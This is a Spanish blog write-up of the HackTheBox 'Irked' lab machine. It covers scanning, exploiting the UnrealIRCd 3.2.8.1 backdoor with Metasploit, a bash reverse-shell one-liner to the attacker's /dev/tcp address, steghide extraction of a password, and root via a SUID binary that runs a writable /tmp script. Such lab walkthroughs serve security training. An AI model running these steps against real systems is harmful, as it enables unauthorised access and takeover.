+++ 
draft = false
date = 2025-11-25T23:24:58Z
title = "Irked Machine - HackTheBox"
description = "Esta es una máquina linux de nivel Easy de HackTheBox"
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Linux #steghide #IRC
----------------
# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.10.117 -oG allPorts
```
En `Service Info` Podemos ver que nos muestran el nombre de dominio `irked.htb`
<img src="/images/Pasted image 20251019210429.png" style="width:100%; height:auto; display:block; margin:auto;">

Por tanto lo agregaremos a nuestro `/etc/hosts`
<img src="/images/Pasted image 20251019210544.png" style="width:100%; height:auto; display:block; margin:auto;">
# Enumeración puerto HTTP 80

Viendo por el servicio web, no encontramos nada interesante, solo una imagen y un mensaje que dice que `IRC is almost working!`, como vimos en el escaneo sabemos que algunos puertos están corriendo el servicio `IRC`.
<img src="/images/Pasted image 20251019210716.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración servicio IRC

## ¿Qué es IRC?

IRC significa **Internet Relay Chat**, y es un **protocolo de comunicación en tiempo real** que permite a varias personas conversar entre sí a través de **canales** (como salas de chat).

Funciona con un modelo **cliente-servidor**:

- Tú usas un **cliente IRC** (un programa o aplicación).
    
- Ese cliente se conecta a un **servidor IRC** (un equipo que gestiona las salas de chat y los usuarios conectados).

## Pentest

Como vimos en el escaneo, tenemos 4 puertos válidos para intentar conectarnos
<img src="/images/Pasted image 20251019211450.png" style="width:100%; height:auto; display:block; margin:auto;">

Para conectarnos a IRC utilizaremos la herramienta `irssi` de la siguiente manera

```bash
irssi
```
y luego dentro de la interfaz escribiremos

```bash
/connect 10.10.10.117 6697
```
<img src="/images/Pasted image 20251019212155.png" style="width:100%; height:auto; display:block; margin:auto;">
y vemos como nos conecta al host, dandonos la versión de IRC que está corriendo en el sistema `Unreal3.2.8.1`
<img src="/images/Pasted image 20251019212307.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando por `Unreal 3.2.8.1` en searchsploit encontramos los siguientes exploits
<img src="/images/Pasted image 20251019212401.png" style="width:100%; height:auto; display:block; margin:auto;">

# Explotación IRC UnrealIRCd 3.2.8.1

Para realizar la explotación utilizaremos metasploit, y utilizaremos el siguiente exploit `exploit/unix/irc/unreal_ircd_3281_backdoor`
<img src="/images/Pasted image 20251019212502.png" style="width:100%; height:auto; display:block; margin:auto;">

Colocamos el RHOSTS:`10.10.10.117` y el RPORT:`6697`y usamos `show payloads`
y usamos `set PAYLOAD cmd/unix/reverse_perl`
<img src="/images/Pasted image 20251019212900.png" style="width:100%; height:auto; display:block; margin:auto;">
Le damos nuestra IP al payload con `set LHOST 10.10.10.14.2` y le damos a `run`,
obteniendo una consola
<img src="/images/Pasted image 20251019213038.png" style="width:100%; height:auto; display:block; margin:auto;">
# Tratamiento tty

Primeros nos mandaremos una reverse shell, para salir del metasploit y tratar la tty
```bash
bash -c 'bash -i >& /dev/tcp/10.10.14.2/9999 0>&1'
```
<img src="/images/Pasted image 20251019213156.png" style="width:100%; height:auto; display:block; margin:auto;">

Aplicamos los siguientes comandos
```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 39 columns 157
```

# Movimiento lateral

Viendo el `/etc/passwd` encontramos 3 usuarios con consolas, el nuestro `ircd`, `djmardov`, y `root`.

Yendo al `home` de `djmardov` nos encontramos con lo siguiente
<img src="/images/Pasted image 20251019213516.png" style="width:100%; height:auto; display:block; margin:auto;">
Tenemos acceso a todos los directorios, pero no tenemos acceso a leer la `user.txt`

Para listar todos los archivos de los directorios utilizamos el siguiente comando
```bash
ls -la *
```
y vemos que hay un archivo llamado `.backup` en el directorio `Documents`
<img src="/images/Pasted image 20251019213920.png" style="width:100%; height:auto; display:block; margin:auto;">
## Estenografía

Viendo que hay en el archivo nos encontramos lo siguiente
<img src="/images/Pasted image 20251019214018.png" style="width:100%; height:auto; display:block; margin:auto;">

Parece ser la contraseña de un archivo de estenografía, como el único archivo que encontramos es la imagen en el puerto 80, la descargaremos y utilizaremos steghide para probar si guarda algún secreto

Con la herramineta `steghide` utilizaremos el siguiente comando para extraer posible información

```bash
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss
```

Consiguiente el archivo `pass.txt`
<img src="/images/Pasted image 20251019215105.png" style="width:100%; height:auto; display:block; margin:auto;">
el cual tiene la posible contraseña de `djmardov`
<img src="/images/Pasted image 20251019215135.png" style="width:100%; height:auto; display:block; margin:auto;">

Probamos conectarnos por SSH con la contraseña encontrada, y obtenemos la user.txt
<img src="/images/Pasted image 20251019215251.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

Buscando por archivos SSUID con el siguiente comando
```bash
find / -perm -4000 2>/dev/null
```
Nos encontramos con el binario `/usr/bin/viewuser` que no es binario del sistema, por tanto vemos si su propietario es `root`
<img src="/images/Pasted image 20251019215519.png" style="width:100%; height:auto; display:block; margin:auto;">

Como su propietario es `root` al ejecutarlo, lo ejecutamos como el usuario `root`, por tanto lo ejecutaremos para ver que hace
<img src="/images/Pasted image 20251019215614.png" style="width:100%; height:auto; display:block; margin:auto;">

Vemos que el archivo nos muestra un error, el error es que no existe el archivo `/tmp/listusers`, por tanto si tenemos permiso de escritura, podemos crear un script malicioso con ese nombre en el directorio `/tmp` y obtener acceso de root

<img src="/images/Pasted image 20251019215838.png" style="width:100%; height:auto; display:block; margin:auto;">

Ahora volvemos a correr el script `/usr/bin/viewuser`
y hacemos un `bash -p`, y vemos que obtenemos permisos de root
<img src="/images/Pasted image 20251019215931.png" style="width:100%; height:auto; display:block; margin:auto;">
y leemos la flag pwneando la máquina
<img src="/images/Pasted image 20251019215945.png" style="width:100%; height:auto; display:block; margin:auto;">
